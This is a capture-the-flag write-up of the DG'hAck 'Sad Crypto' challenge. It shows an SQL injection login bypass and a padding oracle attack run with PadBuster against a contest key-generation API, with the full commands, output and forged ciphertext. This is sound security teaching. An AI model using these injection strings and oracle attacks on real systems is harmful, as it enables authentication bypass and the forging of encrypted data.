---
title: "Writeup DG'hAck: Sad Crypto"
date: 2020-11-30T01:33:35+01:00
draft: false
tags: ["blog", "security", "ctf", "dghack"]
type: "posts"
showDate: true
---

This challenge starts with a login page:

[![The login page](/assets/dghack/sad-crypto-login.png)](/assets/dghack/sad-crypto-login.png)

From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: `1-46-85-30-750-318-37`.

`admin/admin` doesn't seem to work, let's try an SQLi! Entering `" or 1=1 --` as the username reveals a second page:

[![The key generation page](/assets/dghack/sad-crypto-enter-name.png)](/assets/dghack/sad-crypto-enter-name.png)

We seem to be able to enter a patient name (that we **have** to auto-complete), and get a decryption key: `797b4c-c4bd852fe0e32ebda194cb2a9fe00099`.

Looking at the network tab of firefox, we can see the requests that were made:

[![The list of requests made while generating a key](/assets/dghack/sad-crypto-requests.png)](/assets/dghack/sad-crypto-requests.png)

The first request doesn't seem interesting, the second, third and fourth ones are for the auto-complete fields and the last two are used to generate the key.

The `validate` request is a POST that contains an SSN (eg: `ssn=1-78-67-78-356-789-12`). It returns a JSON object:

```json
{
  "success": true,
  "message": "",
  "data": {
    "keyRequest": "f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90"
  }
}
```

The hash is the same one that's used in the last request. The URL format seems to be `/api/v1/keygen/{hash}`. The response contains the decryption key, without the dash and with more chars:

```json
{
  "success": true,
  "message": "",
  "hash": "797b4cc4bd852fe0e32ebda194cb2a9fe00099427615c4aae33ad77c9fa298fd"
}
```

Our first reflex should be to try and pass the SSN that we have to `/validate`. Unfortunately, the server sends back an error:

```json
{
  "success": false,
  "message": "Cette ressource est verrouillée"
}
```

Let's try to find what kind of hash this is:

```bash
$ hashid f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
Analyzing 'f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384)
```

SHA-384 doesn't seem to be vulnerable to any kind of interesting vulnerabilities.. Trying to base64 decode it works, but spits out unrecognizable bytes:

```bash
$ base64 -d <<< f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90
�|���m��m�_���������վ5}�����{N����kF�����^��8�W=ۯ}�w��Ɲ����f����y�t%
```

Now an interesting thing is that if the hash is slightly modified, for example by switching the `f` with an `a`, we get an error:

```json
{
  "ssn": "!-78-67-78-356-789-12",
  "success": false,
  "message": "le numéro de sécurité sociale soumis est invalide"
}
```

The SSN changed! Let's try another modification:
```
Internal Server Error
```

And we have an error 500. This *should* make us think of an [oracle padding attack](https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth): we know if the hash padding is correct or not when modifying it, since it causes an error. It works independently of the cipher that is used.

There are multiple scripts available to exploit this vulnerability, we'll use [PadBuster](https://github.com/AonCyberLabs/PadBuster). We need to give it a few informations:

- the error string (or just let it use status codes)
- the authentication headers
- the URL
- the hash we're trying to attack
- the block size
- the encoding of the hash

We'll set the encoding to `1`, for lowercase hex, and the block size (after a bit of trial and error) to 16.

```bash
$ perl padBuster.pl -error 'Internal Server Error' -header 'authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU' http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 16 -encoding 1

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 103

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

[+] Success: (137/256) [Byte 16]
[+] Success: (204/256) [Byte 15]
[+] Success: (252/256) [Byte 14]
[+] Success: (225/256) [Byte 13]
[+] Success: (187/256) [Byte 12]
[+] Success: (146/256) [Byte 11]
[+] Success: (62/256) [Byte 10]
[+] Success: (156/256) [Byte 9]
[+] Success: (133/256) [Byte 8]
[+] Success: (125/256) [Byte 7]
[+] Success: (57/256) [Byte 6]
[+] Success: (102/256) [Byte 5]
[+] Success: (125/256) [Byte 4]
[+] Success: (83/256) [Byte 3]
[+] Success: (6/256) [Byte 2]
[+] Success: (39/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): fdb2673ae06987a3a0b3644d9e1e46c4
[+] Intermediate Bytes (HEX): c9f5a38e96cc89726cc568401b073676
[+] Plain Text: 1-78-67-78-356-7

Use of uninitialized value $plainTextBytes in concatenation (.) or string at padBuster.pl line 361.
*** Starting Block 2 of 2 ***

[+] Success: (50/256) [Byte 16]
[+] Success: (177/256) [Byte 15]
[+] Success: (234/256) [Byte 14]
[+] Success: (111/256) [Byte 13]
[+] Success: (189/256) [Byte 12]
[+] Success: (151/256) [Byte 11]
[+] Success: (65/256) [Byte 10]
[+] Success: (93/256) [Byte 9]
[+] Success: (95/256) [Byte 8]
[+] Success: (122/256) [Byte 7]
[+] Success: (151/256) [Byte 6]
[+] Success: (34/256) [Byte 5]
[+] Success: (250/256) [Byte 4]
[+] Success: (188/256) [Byte 3]
[+] Success: (124/256) [Byte 2]
[+] Success: (43/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 81c9269993ea9cad943862a197bbeb90
[+] Intermediate Bytes (HEX): c58b4a0bd2628ca8abb86f4695154dcf
[+] Plain Text: 89-12

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): 1-78-67-78-356-789-12
[+] Decrypted value (HEX): 312D37382D36372D37382D3335362D3738392D31320B0B0B0B0B0B0B0B0B0B0B
[+] Decrypted value (Base64): MS03OC02Ny03OC0zNTYtNzg5LTEyCwsLCwsLCwsLCws=
```

And it worked! The plaintext was the SSN. Now we just have to encrypt our number:

```bash
$ perl padBuster.pl -error 'Internal Server Error' -header 'authorization::Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU' http://sadcrypto.chall.malicecyber.com/api/v1/keygen/f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 f8d894b6bbfabe5f5bfd45732e311b41fdb2673ae06987a3a0b3644d9e1e46c481c9269993ea9cad943862a197bbeb90 16 -encoding 1 -plaintext '1-46-85-30-750-318-37'

[...]

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: 2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000
```

Let's try to exchange our hash for a decryption key:

```bash
$ curl -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjpbeyJpZCI6MX1dLCJpYXQiOjE2MDY3MTM1OTksImV4cCI6MTYwNjg4NjM5OX0.iaQaAM73Zq61fFIaCtqBFCPQiA9M42f-2Z71gWQ2jbU' http://sadcrypto.chall.malicecyber.com/api/v1/keygen/2d9d7a71a15312fcf41424dfa18129a37e785ffbb0491d6c95f4de4095356ede00000000000000000000000000000000 | jq
{
  "success": true,
  "message": "",
  "hash": "2ed35bfd91f07094b4447deac135cb8d4b6e45a69cf7a59a65b5f1ca35698e58"
}
```

And we just have to format it as the webapp does to get the flag: `2ed35b-fd91f07094b4447deac135cb8d4b6e45`.

---

[View all of the DG'hAck articles](/tags/dghack).
